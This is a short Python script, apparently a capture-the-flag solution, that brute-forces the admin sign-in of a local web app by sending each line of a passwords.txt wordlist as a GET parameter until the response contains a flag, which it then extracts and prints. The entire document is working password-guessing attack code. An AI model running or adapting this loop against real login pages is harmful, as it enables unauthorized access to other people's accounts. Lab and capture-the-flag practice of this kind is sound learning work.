import requests
import re

url = "http://localhost:8080/?page=signin&username=admin&password={}&Login=Login#"

def get_flag_in_page(page):
	pattern = re.compile('<.*?>')
	for line in page.split("\n"):
		if "flag" in line:
			flag_line = re.sub(pattern, '', line)
			return flag_line.split(":")[1].strip()

with open("passwords.txt", "r") as f:
	for line in f:
		password = line.strip()
		r = requests.get(url.format(password))
		if "flag" in r.text:
			flag_line = get_flag_in_page(r.text)
			print(f"Mot de passe trouvé: {password}")
			print(f"Flag: {flag_line}")
			break
